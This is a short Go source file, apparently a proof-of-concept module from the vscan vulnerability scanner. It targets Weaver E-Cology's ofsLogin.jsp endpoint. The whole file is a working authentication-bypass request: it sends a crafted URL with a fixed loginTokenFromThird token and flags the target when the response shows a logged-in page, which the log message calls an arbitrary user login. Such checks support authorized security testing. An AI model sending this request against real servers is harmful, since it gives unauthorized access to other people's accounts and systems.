package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Cology_ofsLogin_user_login(u string) bool {

	if req, err := pkg.HttpRequset(u+"/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168", "GET", "", false, nil); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "/wui/index.html") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_ofsLogin.jsp任意用户登录漏洞|%s\n", u+"/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168"))
			return true

		}
	}
	return false
}
